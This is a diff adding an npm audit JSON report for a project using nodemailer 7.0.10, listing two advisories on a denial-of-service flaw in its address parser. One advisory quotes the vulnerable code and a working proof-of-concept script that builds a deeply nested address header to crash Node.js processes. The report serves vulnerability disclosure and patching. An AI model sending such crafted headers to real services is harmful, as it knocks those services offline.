@@ -1,0 +1,117 @@
+﻿{
+  "actions": [
+    {
+      "action": "review",
+      "module": "nodemailer",
+      "resolves": [
+        {
+          "id": 1111074,
+          "path": ".>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1111548,
+          "path": ".>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1111074": {
+      "findings": [
+        {
+          "version": "7.0.10",
+          "paths": [
+            ".>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://github.com/advisories/GHSA-rcmh-qjqh-p98v",
+      "created": "2025-12-01T20:44:25.000Z",
+      "id": 1111074,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser ΓåÆ _handleAddress ΓåÆ addressparser ΓåÆ ...`\nfor each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n                groupMembers = groupMembers.concat(member.group);\n            } else {\n                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group` is expected to contain members separated by commas, but in the attackerΓÇÖs payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:', err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n);\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustionΓÇ¥",
+      "reported_by": null,
+      "title": "NodemailerΓÇÖs addressparser is vulnerable to DoS caused by recursive calls",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "nodemailer",
+      "vulnerable_versions": "<=7.0.10",
+      "github_advisory_id": "GHSA-rcmh-qjqh-p98v",
+      "recommendation": "Upgrade to version 7.0.11 or later",
+      "patched_versions": ">=7.0.11",
+      "updated": "2025-12-01T20:44:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-rcmh-qjqh-p98v"
+    },
+    "1111548": {
+      "findings": [
+        {
+          "version": "7.0.10",
+          "paths": [
+            ".>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-14874\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://access.redhat.com/security/cve/CVE-2025-14874\n- https://bugzilla.redhat.com/show_bug.cgi?id=2418133\n- https://github.com/nodemailer/nodemailer\n- https://github.com/advisories/GHSA-46j5-6fg5-4gv3",
+      "created": "2025-12-18T09:30:30.000Z",
+      "id": 1111548,
+      "npm_advisory_id": null,
+      "overview": "A flaw was found in Nodemailer. This vulnerability allows a denial of service (DoS) via a crafted email address header that triggers infinite recursion in the address parser.",
+      "reported_by": null,
+      "title": "Nodemailer is vulnerable to DoS through Uncontrolled Recursion",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-14874"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": "<7.0.11",
+      "github_advisory_id": "GHSA-46j5-6fg5-4gv3",
+      "recommendation": "Upgrade to version 7.0.11 or later",
+      "patched_versions": ">=7.0.11",
+      "updated": "2025-12-18T22:43:41.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-674",
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-46j5-6fg5-4gv3"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 1,
+      "moderate": 1,
+      "high": 0,
+      "critical": 0
+    },
+    "dependencies": 333,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 333
+  }
+}
